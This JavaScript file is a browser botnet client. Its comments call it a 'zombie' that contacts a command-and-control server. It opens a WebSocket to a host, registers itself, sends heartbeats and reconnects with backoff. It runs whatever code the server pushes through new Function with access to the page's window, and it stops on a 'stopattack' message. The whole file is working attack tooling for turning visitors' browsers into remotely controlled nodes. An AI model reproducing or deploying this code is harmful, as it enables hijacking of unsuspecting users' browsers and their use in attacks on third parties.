

(function($){

var zombie;

//client Zombie object
/* utilized code from django WS4Redis project at https://github.com/jrief/django-websocket-redis.git*/
function JSZombie(ip,handler){
		//handler for Websocket messages
		//contact c&c server
		var missed_heartbeats =0;
		var ws = null;
		var heartbeat_msg = "--heartbeat--";
		var heartbeat_interval= null;
		var attempts = 1;
		var must_reconnect = true;
		var facility = String(Math.random());
		var timer;

		//execute code sent from server
    function execute(script){
				code = new Function('args','window',script['code']);
				killHander = code(script['args'],window);
				this.killfct = killHander;
		}
		//stop code execution
		function kill(){
				Promise.resolve(this.killfct).then(function(fct){
					fct();
				});

		}
		this.execute = execute;
		this.kill = kill;
		//establish websocket connection
		function connect(){
			try{
				//create websocket with random facility
				ws = new WebSocket('ws://'+ip+'/ws/'+facility+'?subscribe-broadcast');
				ws.onopen = function(e){
					attempts = 1;
					//start to send heartbeat message
					if(heartbeat_msg && heartbeat_interval == null){
						missed_heartbeats = 0;
						heartbeat_interval = setInterval(send_heartbeat,5000);
					}
					//notify server of facility
					this.send(JSON.stringify({"endpoint":"register","facility":facility}));


				}
				ws.onmessage = function(msg){
					try{
						var msgJson = JSON.parse(msg.data);
						//execute code
						if(msgJson.hasOwnProperty('code')==true){
							zombie.execute(msgJson);

						}
						//stop code
						else if(msgJson.hasOwnProperty('stopattack')==true){
							zombie.kill();
						}
					}
					catch(e){
						//receive heartbeat
						if(msg.data == heartbeat_msg){
							missed_heartbeats =0;
						}

					}

				}
			}
			catch(err){
				try_to_reconnect();
			}
		}
		//connect to server
		connect();


		function is_closing() {
			return ws && ws.readyState === 2;
		}

		function is_closed() {
			return ws && ws.readyState === 3;
		}

		function send_heartbeat(){
			try{
				missed_heartbeats++;
				if(missed_heartbeats>3)
					throw new Error();
				ws.send(JSON.stringify({'heartbeat':heartbeat_msg}));
			}

			catch(e){
				clearInterval(heartbeat_interval);
				heartbeat_interval = null;
				if(!is_closing() && !is_closed()){
					ws.close();
					try_to_reconnect();
				}
			}
		}

		// this code is borrowed from http://blog.johnryding.com/post/78544969349/
		//
		// Generate an interval that is randomly between 0 and 2^k - 1, where k is
		// the number of connection attmpts, with a maximum interval of 30 seconds,
		// so it starts at 0 - 1 seconds and maxes out at 0 - 30 seconds
		function generate_inteval(k) {
			var maxInterval = (Math.pow(2, k) - 1) * 1000;

			// If the generated interval is more than 30 seconds, truncate it down to 30 seconds.
			if (maxInterval > 30*1000) {
				maxInterval = 30*1000;
			}

			// generate the interval to a random number between 0 and the maxInterval determined from above
			return Math.random() * maxInterval;
		}

		function try_to_reconnect() {
			if (must_reconnect && !timer) {
				// try to reconnect
				var interval = generate_inteval(attempts);
				timer = setTimeout(function() {
					attempts++;
					connect();
				}, interval);
			}
		}

		this.update = function(msg){
			var jsonMsg = {'endpoint':'update','message':msg};
			ws.send(JSON.stringify(jsonMsg));
		}


}

//create zombie and connect
zombie = new JSZombie(host);
window.zombie = zombie;
//zombie.makeContact();


})(jQuery);
